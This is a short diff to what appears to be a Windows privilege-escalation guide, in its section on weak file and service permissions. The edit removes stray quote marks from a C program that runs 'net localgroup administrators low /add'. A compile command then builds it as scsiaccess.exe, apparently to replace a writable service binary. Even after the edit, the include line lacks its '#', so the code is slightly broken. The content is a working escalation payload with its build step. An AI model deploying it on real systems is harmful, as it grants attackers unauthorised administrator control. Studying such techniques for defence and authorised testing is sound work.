@@ -30,14 +30,14 @@ Incorrect File and Service permissions:
 ---------------------------------------
 useradd.c
 
-"include <stdlib.h>
-"/* system, NULL, EXIT_FAILURE */
-"#int main ()
-"{
-"int i;
-"i=system ("net localgroup administrators low /add");
-"return 0;
-"}
+include <stdlib.h>
+/* system, NULL, EXIT_FAILURE */
+int main ()
+{
+int i;
+i=system ("net localgroup administrators low /add");
+return 0;
+}
 Compile the code above using the following command:
 ----
 i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
